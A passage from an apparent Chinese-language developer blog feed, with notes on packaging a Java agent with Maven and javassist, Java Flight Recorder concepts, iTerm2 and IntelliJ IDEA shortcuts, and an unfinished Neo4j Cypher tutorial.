<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;java.home&#125;/../lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.fxc.AttachAgent<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>com.fxc.AttachAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>MANIFEST.MF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/DEPENDENCIES<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/LICENSE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/NOTICE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>org.javassist:javassist:jar:*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">&lt;!-- 修改第三方依赖包名称 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">relocations</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">shadedPattern</span>&gt;</span>com.fxc.deps.javassist<span class="tag">&lt;/<span class="name">shadedPattern</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">relocations</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><ol>
<li>在打包jar的时候，已经要记得将ASM/javassist打进去，maven-shade-plugin插件。</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java Agent</tag>
      </tags>
  </entry>
  <entry>
    <title>JFR笔记</title>
    <url>/JFR%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>愿君多采撷，此物最相思。</p>
</blockquote>
<p>整理JFR相关知识 。</p>
<a id="more"></a>

<h1 id="什么是JFR？"><a href="#什么是JFR？" class="headerlink" title="什么是JFR？"></a>什么是JFR？</h1><p>JFR 是 Java Flight Record （Java飞行记录） 的缩写，是 JVM 内置的基于事件的JDK监控记录框架。这个起名就是参考了黑匣子对于飞机的作用，将Java进程比喻成飞机飞行，==主要用于问题定位和持续监控==。</p>
<p>JFR性能非常高效，对于业务影响很小，因为这个框架本来就是用来长期在线上部署的框架。这个记录可以输出成二进制文件，用户可以指定最大记录时间，或者最大记录大小，供用户在需要的时候输出成文件进行事后分析。</p>
<p>JFR 的前身也是 JFR，只不过这个 J 不是 Java 而是 JRockit。在 JRockit 虚拟机时代，就有这样一个工具用来记录 Java 虚拟机运行时各项数据。在 Oracle 收购 Sun 公司之后，Hotspot 虚拟机时代，也一直延续了这个工具：</p>
<ul>
<li>JFR 0.9 版本对应 JDK 7 和JDK 8：</li>
<li>在 JDK 8u40 之后，可以在运行时灵活地打开关闭 JFR。 </li>
<li>JFR 1.0 版本对应 JDK 9 和 JDK 10： 在这一版本之后，增加了 JFR 事件接口，用户可以生产或者消费某种事件。 </li>
<li>JFR 2.0 版本对应 JDK 11，详细讨论说明。</li>
</ul>
<p>JFR具有以下关键的特性： </p>
<ul>
<li><p>低开销，可在生产环境核心业务进程中始终在线运行。</p>
</li>
<li><p>可以进行运行时分析，可以分析 Java 应用程序，JVM 内部以及当前Java进程运行环境等多因素。</p>
</li>
<li><p>JFR基于事件采集，可以分析非常底层的信息，例如对象分配，方法采样与热点方法定位与调用堆栈，安全点分析与锁占用时长与堆栈分析，GC 相关分析以及 JIT 编译器相关分析（例如 CodeCache ）</p>
</li>
<li><p>完善的 API 定义，用户可以自定义事件的生产与消费。</p>
</li>
</ul>
<h1 id="核心-Event事件"><a href="#核心-Event事件" class="headerlink" title="核心-Event事件"></a>核心-Event事件</h1><p>在 JFR中，一切皆为 Event： </p>
<ul>
<li>任意JVM行为都是一个Event，类加载对应 Class Load Event </li>
<li>开启 JFR 记录也是一个Event，对应的就是 Recording Reason Event </li>
<li>就算是有 Event 丢失，他也是一个 Event，对应 Data Loss Event</li>
</ul>
<p>Event 在特定的时间点产生，每个Event是由<strong>名称</strong>，<strong>时间戳</strong>还有 <strong>Event Payload</strong>组成。</p>
<p>Event Payload包含例如 CPU负载、Event 发生之前还有之后的 Java 堆大小、 获取锁的线程 ID 等等。</p>
<p>大部分的 Event，都有 Event 是在哪个线程发生的，Event 发生的时候这个线程的调用栈，Event 的持续时间。</p>
<p>利用这些信息，我们可以回溯 Event 发生当时的情况。</p>
<h2 id="Event-分类"><a href="#Event-分类" class="headerlink" title="Event 分类"></a>Event 分类</h2><p>Event 按照采集方式可以分为三种：</p>
<ol>
<li>Instant Event：顾名思义，这种 Event 在发生时就立刻采集。例如：Throw Exception Event 还有 Thread Start Event，类似于这种==在某一时刻发生的 Event==。</li>
<li>Duration Event：这种 Event 需要耗费一些时间，在完成的时候会记录。对于这种类型的 Event，可以设置一个时间限制，超过这个时间限制的才会记录。例如 GC Event，Thread Sleep Event。</li>
<li>Sample Event（Requestable Event）：按照一定的频率采集，这个频率是可以配置的。例如 Thread Dump Event，Method Sampling Event</li>
</ol>
<p>由于 JFR 会采集很多很多的数据，为了效率，最好配置自己感兴趣的事件采集；</p>
<p>对于 Duration Event 设置时间限制，一般我们对于时间短的事件并不关心。</p>
<p>Event 会被写入 .jfr 的二进制文件（二进制文件对于应用来说读写效率最高）中，以 little endian base 128 的形式编码，这里我们用一个 Event 举个例子：</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JFR</tag>
      </tags>
  </entry>
  <entry>
    <title>iTerm2 快捷键速查手册</title>
    <url>/iTerm2-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>终南阴岭秀，积雪浮云端。</p>
</blockquote>
<p>整理敲板子过程中的快捷键 。</p>
<a id="more"></a>

<h1 id="Tab"><a href="#Tab" class="headerlink" title="Tab"></a>Tab</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">新建标签：command + t</span><br><span class="line"></span><br><span class="line">关闭标签：command + w</span><br><span class="line"></span><br><span class="line">切换标签：command + 数字 / command + 左右方向键</span><br><span class="line"></span><br><span class="line">切换全屏：command + enter</span><br><span class="line"></span><br><span class="line">查找：command + f</span><br></pre></td></tr></table></figure>

<h1 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">垂直分屏：command + d</span><br><span class="line"></span><br><span class="line">水平分屏：command + shift + d</span><br><span class="line"></span><br><span class="line">切换屏幕：command + option + 方向键 / command + [ 或 command + ]</span><br><span class="line"></span><br><span class="line">查看历史命令：command + ;</span><br><span class="line"></span><br><span class="line">查看剪贴板历史：command + shift + h</span><br></pre></td></tr></table></figure>



<h1 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">清除当前行：ctrl + u</span><br><span class="line"></span><br><span class="line">到行首：ctrl + a</span><br><span class="line"></span><br><span class="line">到行尾：ctrl + e</span><br><span class="line"></span><br><span class="line">按单词移动：option + 左/右 方向键</span><br><span class="line"></span><br><span class="line">上一条命令：ctrl + p</span><br><span class="line"></span><br><span class="line">删除到文本末尾：ctrl + k</span><br><span class="line"></span><br><span class="line">搜索命令历史：ctrl + r</span><br><span class="line"></span><br><span class="line">删除当前光标的字符：ctrl + d</span><br><span class="line"></span><br><span class="line">删除光标之前的字符：ctrl + h</span><br><span class="line"></span><br><span class="line">删除光标之前的单词：ctrl + w</span><br><span class="line"></span><br><span class="line">交换光标处文本：ctrl + t</span><br><span class="line"></span><br><span class="line">清屏1：command + r</span><br><span class="line"></span><br><span class="line">清屏2：ctrl + l</span><br><span class="line"></span><br><span class="line">⌘ + 数字在各 tab 标签直接来回切换</span><br><span class="line"></span><br><span class="line">选择即复制 + 鼠标中键粘贴，这个很实用</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>iTerm2</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA 快捷键速查手册</title>
    <url>/IDEA-%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>大漠孤烟直，长河落日圆。</p>
</blockquote>
<p>整理敲板子过程中的快捷键 。</p>
<a id="more"></a>

<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>try-catch：cmd+option+t</p>
<p>查看接口实现：option+cmd+b</p>
<p>搜索查看，类，api：cmd+o</p>
<p>函数调用：ctrl+option+h</p>
<p>自动补全变量：option+command+v</p>
<p>自动包围代码，例如添加try-catch代码块：option+command+t</p>
<p>生成注释块：ctrl+shift+/</p>
<p>生成方法注释：/**+tab</p>
<p>查看所有方法：command+F12</p>
<p>查看继承关系：Diagram-&gt;showDiagrams</p>
<p>搜索：shift+command+F</p>
<p>格式化代码块：command+option+L</p>
<p>批量重命名：shift+F6</p>
<p>中文颜文字：shift+6</p>
<p>批量编写：ctrl+G       先选中某部分，然后多次ctrl+全选，直接批量编写</p>
<p>批量框选：option+鼠标左键拖拽  这个逆天了 感觉像画画一样</p>
<p>整行移动： option+shift+上/下  快速调整代码行顺序 交换位置</p>
<p>快速显示/隐藏当前方法体 : command + . </p>
<p>快速概览当前类的所有方法：command + shift + +/-</p>
<p>统一修改方法签名： command+F6 </p>
<p>查看历史剪切板： command +shift+  v</p>
<p>代码抽取：</p>
<ol>
<li>抽取为局部变量：command+option+v 将字符串常量提取出来 单独声明</li>
<li>抽取为成类的成员变量：command+option+F  </li>
<li>抽取为成类的静态常量：command+option+C</li>
<li>抽取为方法入参：command+option+P</li>
<li>抽取为方法：command + option + M</li>
</ol>
<p>一些for循环快捷键：</p>
<p>其实所有for循环都在live templates里面，当然可以自定义：</p>
<ol>
<li>iter         <code>for (String arg : args)</code></li>
<li>itar      Iterate elements of array   <code>for (int j = 0; j &lt; args.length; j++)</code></li>
<li>itco     Iterate elements of java.util.Collection    <code>for (Iterator iterator = collection.iterator(); iterator.hasNext();)</code></li>
<li>itit      Iterate java.util.Iterator     <code>while (iterator.hasNext())</code></li>
<li>itli  Iterate elements of java.util.List <code>for (int j = 0; j &lt; list.size(); j++)</code></li>
<li>fori           <code>for (int j = 0; j &lt; ; j++)</code></li>
<li>foreach         <code>for(:)</code></li>
</ol>
<p>以上快捷键直接敲就行 不用.的方式去触发。</p>
<p>IDEA快捷键 自带Postfix</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">"Jack"</span>.<span class="keyword">var</span> -&gt; String name = <span class="string">"Jack"</span></span><br><span class="line"></span><br><span class="line">name.notnull / name.nn -&gt; <span class="keyword">if</span>(name != <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">inputStream.close();.<span class="keyword">try</span> -&gt; <span class="keyword">try</span>&amp;<span class="keyword">catch</span></span><br><span class="line"></span><br><span class="line">obj.cast -&gt; (TYPE_TO_CAST)obj</span><br><span class="line"></span><br><span class="line">name.<span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> RuntimeException().<span class="keyword">throw</span></span><br><span class="line"></span><br><span class="line">list.<span class="keyword">for</span> / list.fori</span><br><span class="line"></span><br><span class="line">name.soutv -&gt; System.out.Println(<span class="string">"name = "</span>+name);</span><br><span class="line"></span><br><span class="line">name.<span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"><span class="string">"%d = %d + %d"</span>.format</span><br><span class="line"></span><br><span class="line">psfs -&gt; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>Neo4j爬坑记</title>
    <url>/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>一点浩然气，千里快哉风。</p>
</blockquote>
<p>今天来记录自己Neo4j实战、爬坑记录。</p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>图数据库只有两点：节点，关系。</p>
<p>节点node可以类比理解为Java里面的对象实例，关系其实就是edge边信息。</p>
<h1 id="查询语句CQL：CYPHER"><a href="#查询语句CQL：CYPHER" class="headerlink" title="查询语句CQL：CYPHER"></a>查询语句CQL：CYPHER</h1><p>类似SQL语句一样，在Neo4j里面是使用Cypher语句进行查询。</p>
<p>Cypher句法由四个不同的部分组成，每一部分都有一个特殊的规则：</p>
<ul>
<li><p>start——查找图形中的起始节点。</p>
</li>
<li><p>match——匹配图形模式，可以定位感兴趣数据的子图形。</p>
</li>
<li><p>where——基于某些标准过滤数据。</p>
</li>
<li><p>return——返回感兴趣的结果。</p>
</li>
</ul>
<p>Cypher的模式匹配性质使得图形模式成为任何查询的重点问题。</p>
<p>常用的Neo4j CQL命令/条款如下：</p>
<table>
<thead>
<tr>
<th>S.No.</th>
<th>CQL命令/条</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1。</td>
<td>CREATE 创建</td>
<td>创建节点，关系和属性</td>
</tr>
<tr>
<td>2。</td>
<td>MATCH 匹配</td>
<td>检索有关节点，关系和属性数据</td>
</tr>
<tr>
<td>3。</td>
<td>RETURN 返回</td>
<td>返回查询结果</td>
</tr>
<tr>
<td>4。</td>
<td>WHERE 哪里</td>
<td>提供条件过滤检索数据</td>
</tr>
<tr>
<td>5。</td>
<td>DELETE 删除</td>
<td>删除节点和关系</td>
</tr>
<tr>
<td>6。</td>
<td>REMOVE 移除</td>
<td>删除节点和关系的属性</td>
</tr>
<tr>
<td>7。</td>
<td>ORDER BY以…排序</td>
<td>排序检索数据</td>
</tr>
<tr>
<td>8。</td>
<td>SET 组</td>
<td>添加或更新标签</td>
</tr>
</tbody></table>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="CREATE创建"><a href="#CREATE创建" class="headerlink" title="CREATE创建"></a>CREATE创建</h3><p><strong>Neo4j CQL创建一个没有属性的节点</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (&lt;node-name&gt;:&lt;label-name&gt;)  节点名：标签名</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (emp:Employee)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (:Employee)</span><br></pre></td></tr></table></figure>

<p><strong>Neo4j CQL创建具有属性的节点</strong></p>
<p>Neo4j CQL“CREATE”命令用于创建带有属性的节点。 它创建一个具有一些属性（键值对）的节点来存储数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (</span><br><span class="line">   &lt;node-name&gt;:&lt;label-name&gt;</span><br><span class="line">   &#123;    </span><br><span class="line">      &lt;key&gt;:&lt;Value&gt;</span><br><span class="line">      ........</span><br><span class="line">      &lt;n-key&gt;:&lt;n-Value&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (dept:Dept &#123; deptno:10, dname:&quot;Accounting&quot;, location:&quot;Hyderabad&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>创建多个标签到节点</strong></p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (&lt;node-name&gt;:&lt;label-name1&gt;:&lt;label-name2&gt;.....:&lt;label-namen&gt;)复制代码</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE (m:Movie:Cinema:Film:Picture) 一个节点有多个标签</span><br></pre></td></tr></table></figure>

<h3 id="MATCH查询"><a href="#MATCH查询" class="headerlink" title="MATCH查询"></a>MATCH查询</h3><p>Neo4j CQL MATCH命令用于</p>
<ul>
<li>从数据库获取有关节点和属性的数据</li>
<li>从数据库获取有关节点，关系和属性的数据</li>
</ul>
<p>MATCH命令语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH </span><br><span class="line">(</span><br><span class="line">   &lt;node-name&gt;:&lt;label-name&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH (dept:Dept)</span><br></pre></td></tr></table></figure>

<p>但是执行后会报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Neo.ClientError.Statement.SyntaxError: </span><br><span class="line">Query cannot conclude with MATCH </span><br><span class="line">(must be RETURN or an update clause) (line 1, column 1 (offset: 0))</span><br></pre></td></tr></table></figure>

<p>如果你观察到错误消息，它告诉我们，我们可以使用MATCH命令与RETURN子句或UPDATE子句。</p>
<h3 id="RETURN返回"><a href="#RETURN返回" class="headerlink" title="RETURN返回"></a>RETURN返回</h3><p>Neo4j CQL RETURN子句用于 -</p>
<ul>
<li>检索节点的某些属性</li>
<li>检索节点的所有属性</li>
<li>检索节点和关联关系的某些属性</li>
<li>检索节点和关联关系的所有属性</li>
</ul>
<p>RETURN命令语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETURN </span><br><span class="line">   &lt;node-name&gt;.&lt;property1-name&gt;,</span><br><span class="line">   ........</span><br><span class="line">   &lt;node-name&gt;.&lt;propertyn-name&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH (e:Employee) RETURN e</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH (dept: Dept)</span><br><span class="line">RETURN dept.deptno,dept.dname,dept.location</span><br></pre></td></tr></table></figure>

<h3 id="关系基础"><a href="#关系基础" class="headerlink" title="关系基础"></a>关系基础</h3><p>Neo4j图数据库遵循属性图模型来存储和管理其数据。</p>
<p>根据属性图模型，关系应该是定向的。 否则，Neo4j将抛出一个错误消息。</p>
<p>基于方向性，Neo4j关系被分为两种主要类型。</p>
<ul>
<li>单向关系</li>
<li>双向关系</li>
</ul>
<p><strong>使用新节点创建关系</strong></p>
<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE (e:Employee)-[r:DemoRelation]-&gt;(c:Employee)</span><br></pre></td></tr></table></figure>

<p>这句会创建节点e，节点c，以及e -&gt; c的关系r，这里需要注意方向，比如双向是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE (e:Employee)&lt;-[r:DemoRelation]-&gt;(c:Employee)</span><br></pre></td></tr></table></figure>

<p><strong>使用已知节点创建带属性的关系：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH (&lt;node1-label-name&gt;:&lt;node1-name&gt;),(&lt;node2-label-name&gt;:&lt;node2-name&gt;)</span><br><span class="line">CREATE  </span><br><span class="line">    (&lt;node1-label-name&gt;)-[&lt;relationship-label-name&gt;:&lt;relationship-name&gt;</span><br><span class="line">    &#123;&lt;define-properties-list&gt;&#125;]-&gt;(&lt;node2-label-name&gt;)</span><br><span class="line">RETURN &lt;relationship-label-name&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还是一系列键值对</p>
</blockquote>
<p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MATCH (cust:Customer),(cc:CreditCard) </span><br><span class="line">CREATE (cust)-[r:DO_SHOPPING_WITH&#123;shopdate:<span class="string">"12/12/2014"</span>,price:<span class="number">55000</span>&#125;]-&gt;(cc) </span><br><span class="line">RETURN r</span><br></pre></td></tr></table></figure>

<p><strong>检索关系节点的详细信息：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH </span><br><span class="line">(&lt;node1-label-name&gt;)-[&lt;relationship-label-name&gt;:&lt;relationship-name&gt;]-&gt;(&lt;node2-label-name&gt;)</span><br><span class="line">RETURN &lt;relationship-label-name&gt;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
